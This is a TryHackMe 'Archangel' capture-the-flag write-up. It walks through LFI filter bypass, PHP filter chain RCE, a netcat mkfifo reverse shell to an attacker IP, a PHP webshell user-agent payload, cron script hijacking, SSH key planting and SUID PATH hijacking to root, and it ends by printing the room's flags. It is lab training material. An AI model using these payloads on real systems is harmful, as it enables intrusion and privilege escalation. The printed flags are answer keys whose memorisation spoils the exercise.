# 😇 Archangel

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/archangel)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/archangel)
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)](https://tryhackme.com/room/archangel)
[![Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)](https://tryhackme.com/room/archangel)

---

| | |
|---|---|
| **Target** | `10.48.139.244` |
| **OS** | Linux |
| **Attack Surface** | HTTP vhost enumeration, LFI, PHP filter chain RCE |
| **Privesc** | cron (www-data → archangel), PATH hijacking SUID binary (archangel → root) |

Archangel has one open web port. A contact email in the homepage reveals a hidden virtual hostname. That host runs a PHP page with an LFI bug — reading the source exposes the exact filter rules, and a one-character swap bypasses them. RCE comes from a PHP filter chain; a world-writable cron script hands over a lateral shell, and a SUID binary that calls `cp` without a full path gives root.

---

## 🔍 Enumeration

### Port Scan

Scan all TCP ports and the top 200 UDP ports.

```bash
sudo nmap -sS -vv -p- -oA nmap/tcp_syn 10.48.139.244
sudo nmap -sU -vv --top-ports 200 -oA nmap/udp_top 10.48.139.244
```

```text
22/tcp  open  SSH
80/tcp  open  HTTP — Apache/2.4.29 (Ubuntu)
68/udp  open|filtered  dhcpc  (noise — ignore)
```

SSH and HTTP are the only attack surface.

### Directory Scan — archangel

Scan for directories and files on the main vhost.

```bash
ffuf -u http://archangel/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_archangel.json
```

```text
/                → 200
/images/         → 301
/pages/          → 301  (static HTML templates only)
/flags/          → 301  (dead end)
/layout/         → 301
/licence.txt     → 200
/server-status   → 403
```

Nothing useful on the main site.

### Vhost Discovery

Check the homepage source for email addresses — they often reveal internal hostnames.

```bash
curl -s http://archangel/ | grep -i mail
# → support@mafialive.thm
```

Add the hostname and grab the page.

```bash
echo "10.48.139.244 mafialive.thm" | sudo tee -a /etc/hosts
curl -s http://mafialive.thm/
```

The response contains Flag 1.

### Directory Scan — mafialive.thm

Scan the new vhost for directories and files.

```bash
ffuf -u http://mafialive.thm/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_mafia.json
```

```text
/robots.txt  → 200  (Disallow: /test.php)
/test.php    → 200
```

`robots.txt` points straight at the interesting endpoint.

---

## 💀 Initial Access

### LFI Discovery

`/test.php` has a `?view=` parameter and a button that loads a local PHP file. This is LFI (Local File Inclusion) — the app includes a file you name in the URL.

```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
→ "Control is an illusion"
```

### Reading the Filter Logic

Read the `test.php` source before trying any bypass. `php://filter` with base64 encoding returns the file as base64 — PHP never executes it.

```bash
curl -s "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d
```

The source has a hidden comment with Flag 2. It also shows the filter:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
```

The filter blocks `../..` and requires `/var/www/html/development_testing` in the path.

### Path Traversal Bypass

The filter blocks `../..` as a string but not `.././`. Replace every `../` with `.././` — the path still climbs directories but the banned string never appears.

```bash
curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
...
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

### Log Poisoning (failed)

```bash
curl -s -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
curl -v "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=id"
```

The access log is not readable through the LFI. Move to a different approach.

### PHP Filter Chain RCE

Use the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to build `<?php system($_GET["cmd"]); ?>` from iconv encoding tricks. No file write needed — the LFI alone is enough.

The generator outputs a chain ending in `resource=php://temp`. The filter rejects this because `php://temp` does not contain `/var/www/html/development_testing`. Append it as a query string. PHP ignores query strings on `php://` streams, but `strpos()` sees the string and passes the check.

```bash
python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|' \
  > /tmp/chain.txt
```

This wrapper script URL-encodes the chain and runs commands:

```bash
#!/bin/bash
CHAIN=$(python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|')
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")
CMD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$1")
curl -s "http://mafialive.thm/test.php?view=${ENCODED}&cmd=${CMD}" \
  | strings | sed 's/<[^>]*>//g' \
  | grep -v "^[[:space:]]*$" \
  | grep -v "INCLUDE\|Test Page\|button\|Here is\|DOCTYPE\|html\|head\|body\|title\|href"
```

Confirm RCE:

```bash
./rce.sh id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

Start a listener, then trigger the shell.

```bash
nc -nlvp 4444 -s 192.168.240.231
```

```bash
./rce.sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.240.231 4444 >/tmp/f"
```

```text
connect to [192.168.240.231] from (UNKNOWN) [10.48.139.244] 42158
www-data@ubuntu:/var/www/html/development_testing$
```

Read the user flag.

```bash
cat /home/archangel/user.txt
```

---

## 🔁 Privilege Escalation

### www-data → archangel (Cron + World-Writable Script)

Check for files any user can write to.

```bash
find / -type f -writable 2>/dev/null | grep -v proc | grep -v sys | xargs ls -lah
```

```text
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```

`/opt/helloworld.sh` is world-writable and owned by `archangel`. A cron job runs it as `archangel`. Overwrite it to copy `bash` and set the SUID bit.

```bash
cat > /opt/helloworld.sh << 'EOF'
#!/bin/bash
cp /bin/bash /home/archangel/bash
chmod +s /home/archangel/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
EOF
```

Watch for the SUID copy to appear.

```bash
watch -n 1 ls -lah /home/archangel
```

```text
Every 1.0s: ls -lah /home/archangel        ubuntu: Sat Apr 25 16:05:07 2026

total 1.2M
drwxr-xr-x 6 archangel archangel 4.0K Apr 25 16:05 .
drwxr-xr-x 3 root      root      4.0K Nov 18  2020 ..
-rwsr-sr-x 1 archangel archangel 1.1M Apr 25 16:05 bash
drwxr-xr-x 2 archangel archangel 4.0K Nov 18  2020 myfiles
drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
```

Once the SUID `bash` copy appears, run it with `-p` to keep the effective UID.

```bash
/home/archangel/bash -p
```

```text
bash-4.4$ id
uid=33(www-data) gid=33(www-data) euid=1001(archangel) egid=1001(archangel) groups=1001(archangel),33(www-data)
```

Read Flag 4 from the `secret` directory.

```bash
cat /home/archangel/secret/user2.txt
```

### Stable Shell via SSH

Generate a key pair and place the public key in `archangel`'s `authorized_keys`.

```bash
ssh-keygen -t ed25519 -f ./private.key
mkdir -p /home/archangel/.ssh
cat ./private.key.pub >> /home/archangel/.ssh/authorized_keys
```

SSH in for a proper TTY.

```bash
chmod 600 private.key
ssh -i ./private.key archangel@archangel
```

### archangel → root (PATH Hijacking — SUID Binary)

`/home/archangel/secret/backup` is SUID root. Run `strace` to see what it calls internally.

```bash
strace ./backup 2>&1
```

The key lines in the output — the binary forks a child process, and that child tries to run `cp` without a full path:

```text
setuid(0)                               = -1 EPERM (Operation not permitted)
setgid(0)                               = -1 EPERM (Operation not permitted)
clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0x7ffec78cf01c) = 1057
wait4(1057, cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
0x7ffec78cf018, 0, NULL)    = 1057
+++ exited with 0 +++
```

The `setuid(0) = EPERM` is a strace artifact — ptrace disables SUID. The binary escalates fine when run without strace. What matters is the child: it calls `cp` with no `/bin/` prefix, so `cp` resolves through `PATH`.

Create a malicious `cp` in the current directory.

```bash
vi cp
```

```bash
#!/bin/bash
chmod +s /bin/bash 2> /dev/null
```

Make it executable, prepend `.` to `PATH`, and run the binary.

```bash
chmod +x cp
PATH=.:$PATH ./backup
```

The SUID binary calls `./cp` as root. Check `/bin/bash` now has the SUID bit.

```bash
ls -lah /bin/bash
```

```text
-rwsr-sr-x 1 root root 1.1M Jun  7  2019 /bin/bash
```

Run `bash -p` to get a root shell.

```bash
/bin/bash -p
```

```text
bash-4.4# id
uid=1001(archangel) gid=1001(archangel) euid=0(root) egid=0(root) groups=0(root),1001(archangel)
```

Read the root flag.

```bash
cat /root/root.txt
```

---

## 🗺️ Attack Chain

```
[archangel:80 — Apache/2.4.29]
    |
    | homepage source → support@mafialive.thm
    v
[mafialive.thm vhost]                   → Flag 1
    |
    | robots.txt → /test.php
    v
[LFI — test.php?view=]
    |
    | php://filter base64 → test.php source
    v
[Filter Logic Reversed]                  → Flag 2
    |  blocks: ../..
    |  requires: /var/www/html/development_testing
    |
    | .././ chaining → /etc/passwd read confirmed
    | log poisoning → not possible
    | PHP filter chain + php://temp?<path> trick → RCE
    v
[www-data shell]
    |
    | /home/archangel/user.txt           → Flag 3
    |
    | /opt/helloworld.sh (world-writable, cron runs as archangel)
    | inject: cp /bin/bash + chmod +s → wait for cron
    v
[archangel shell — euid=1001]
    |
    | /home/archangel/secret/user2.txt  → Flag 4
    |
    | backup (SUID root) calls cp without full path
    | PATH=.:$PATH + malicious cp → chmod +s /bin/bash
    v
[root — euid=0]
    |
    | /root/root.txt                     → Flag 5
    v
[Pwned]
```

---

## 📌 Key Takeaways

- Always check page source for email addresses — they reveal vhosts not linked anywhere else
- Read PHP source with `php://filter/convert.base64-encode` before guessing any bypass — the filter rules are right there
- `strpos()` blocking `../..` is not the same as blocking path traversal — `.././` still climbs directories
- PHP filter chain RCE needs only a working LFI — no file upload, no log write needed
- Append the required string as a query on `php://temp` to pass a `strpos()` check without breaking the chain
- World-writable scripts owned by another user and run by cron are instant lateral movement — always check `/opt/` and `/etc/cron*`
- SUID binaries that call commands without full paths are vulnerable to PATH hijacking — prepend a writable directory to `PATH` and plant the command there

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Wordlist Scanning | [T1595.003](https://attack.mitre.org/techniques/T1595/003) |
| Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Defense Evasion | Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027) |
| Privilege Escalation | Scheduled Task/Job: Cron | [T1053.003](https://attack.mitre.org/techniques/T1053/003) |
| Privilege Escalation | Hijack Execution Flow: Path Interception by PATH Environment Variable | [T1574.007](https://attack.mitre.org/techniques/T1574/007) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | [T1548.001](https://attack.mitre.org/techniques/T1548/001) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | TCP SYN + UDP port scan |
| `ffuf` | Directory and file scan on both vhosts |
| `curl` | Manual LFI probing, source exfiltration, RCE delivery |
| `php_filter_chain_generator.py` | Generate PHP filter chain RCE payload |
| `rce.sh` | Custom wrapper — URL-encodes chain and runs commands |
| `nc` | Reverse shell listener |
| `ssh-keygen` | Generate ed25519 key pair for stable archangel shell |
| `strace` | Confirm backup binary calls cp without full path |

---

## 🚩 Flags

<details>
<summary><code>Flag 1 — vhost discovery</code></summary>

`thm{f0und_th3_r1ght_h0st_n4m3}`

</details>

<details>
<summary><code>Flag 2 — LFI source read</code></summary>

`thm{explo1t1ng_lf1}`

</details>

<details>
<summary><code>user.txt</code></summary>

`thm{lf1_t0_rc3_1s_tr1cky}`

</details>

<details>
<summary><code>user2.txt</code></summary>

`thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`

</details>

<details>
<summary><code>root.txt</code></summary>

`thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`

</details>
